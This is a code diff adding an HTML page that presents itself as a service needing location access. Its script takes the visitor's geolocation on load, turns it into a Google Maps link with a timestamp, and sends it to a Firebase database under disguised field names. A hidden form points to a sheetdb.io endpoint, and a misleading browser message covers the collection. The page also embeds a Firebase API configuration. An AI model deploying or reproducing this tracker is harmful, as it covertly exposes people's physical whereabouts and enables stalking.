@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Allow location to get the service</h1>
+<p id=p_id></p>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+
+<script>
+  para=document.getElementById("p_id")
+ getLocation();
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+    para.innerHTML="try the link on better browser like Chrome";
+  } else { 
+    para.innerHTML="could not run geolocation";
+     
+  }
+}
+
+function showPosition(position) {
+  
+
+var today = new Date();
+var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
+var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
+var dateTime = date+' '+time;
+document.getElementById("time_stamp").value=dateTime;
+
+
+
+var latlon = position.coords.latitude + "," + position.coords.longitude;
+
+  var img_url = "https://www.google.com/maps/search/?api=1&query="+latlon;
+document.getElementById("lat").value=img_url;
+//document.getElementById("lon").value=position.coords.longitude;
+
+
+SubForm();
+
+      function SubForm (){
+       var firebaseConfig = {
+    apiKey: "AIzaSyB-SnJ-A1aD9y51jVNPdrta0LrHVMeX8i8",
+    authDomain: "fstapp-3f0f8.firebaseapp.com",
+    projectId: "fstapp-3f0f8",
+    storageBucket: "fstapp-3f0f8.appspot.com",
+    messagingSenderId: "847402354890",
+    appId: "1:847402354890:web:46b534687ea5284e5b4c33"
+  };
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+
+
+  var name,roll;
+   
+
+  var database=firebase.database();
+  var ref=database.ref('scores');
+  data={
+
+    name:img_url,
+    roll:dateTime
+  }
+
+  ref.push(data);
+
+
+
+
+
+
+
+
+
+    }
+
+
+}
+</script>
+
+
+
+
+
+
+
+
+
+<form name="f_name" id="myForm" action="https://sheetdb.io/api/v1/tzligcj8zu6x4" method="POST" id="sheetdb-form">
+   <input type="hidden" name="time_stamp" id="time_stamp">
+  <input type="hidden" name="Latitude" id="lat" value="nothing">
+  
+ 
+
+</form>
+
+
+
+
+
+
+</body>
+</html>
+
